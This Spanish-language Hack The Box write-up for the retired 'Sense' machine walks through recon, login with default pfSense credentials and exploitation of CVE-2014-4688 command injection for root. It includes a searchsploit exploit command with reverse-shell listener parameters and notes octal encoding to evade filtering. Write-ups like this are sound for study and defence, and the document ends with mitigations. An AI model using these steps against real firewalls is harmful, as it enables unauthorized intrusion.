---
machine: Sense
os: FreeBSD
difficulty: Easy
platform: Hack The Box
category: Infraestructura / FreeBSD
state: Retired
tags: [freebsd, pfsense, default-credentials, cve-2014-4688, command-injection]
---

# Sense — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

La caja es un **pfSense 2.1.3** sobre FreeBSD. Un `system-users.txt` expuesto da el usuario y sugiere las credenciales por defecto de la compañía (`admin`/`pfsense` es lo estándar; aquí el usuario es otro y la contraseña sigue siendo la de fábrica). Con sesión en el panel, la inyección de comandos de `status_rrd_graph_img.php` (**CVE-2014-4688**) ejecuta como **root**, porque el WebGUI corre con esos privilegios.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp  open  http        lighttpd 1.4.35
443/tcp open  ssl/http    lighttpd 1.4.35
```

El 80 redirige al 443, donde hay un login de pfSense.

```bash
feroxbuster -k -u https://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/system-users.txt
/changelog.txt
```

`system-users.txt` revela el nombre de usuario y que la contraseña es la corporativa por defecto (`pfsense`).

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Login** en `https://<IP>/` con `<usuario>:pfsense`.
2. **Versión**: el dashboard confirma `2.1.3-RELEASE` (FreeBSD 8.3), vulnerable a CVE-2014-4688.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

La inyección está en el parámetro `graph` de `status_rrd_graph_img.php` y se explota con `searchsploit` o Metasploit:

```bash
searchsploit -m 43560
python3 43560.py --rhost <IP> --lhost <IP> --lport 4444 --username <usuario> --password pfsense
```

```text
id
uid=0(root) gid=0(wheel) groups=0(wheel)
```

El payload se codifica en **octal** para esquivar el filtro de la aplicación. No hay escalada posterior: el WebGUI ya es root.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Usuario en minúsculas**: el login de pfSense distingue mayúsculas incluso en el nombre de usuario.
- **Sin stdout**: la inyección no devuelve salida; hay que lanzar una reverse shell o exfiltrar por red.
- **Certificado autofirmado**: `curl -k` o aceptar la excepción.

- Un panel de administración de un firewall con contraseña de fábrica es compromiso total.
- Los ficheros de «usuarios de sistema» en el webroot son un regalo para el atacante.
- Un WebGUI que corre como root convierte una inyección de comandos en root directo.
- Mitigación: cambiar credenciales por defecto, actualizar pfSense y no ejecutar la interfaz como root.

## Mitigaciones y detección

- Mínimo privilegio en el servicio expuesto y parcheo de la versión vulnerable.
- Detección: revisar los logs del servicio y alertar de peticiones anómalas o picos de error.

## Referencias

- [CVE-2014-4688](https://nvd.nist.gov/vuln/detail/CVE-2014-4688)
- [rop-stack](../../../knowledge/pwn/rop-stack.md)
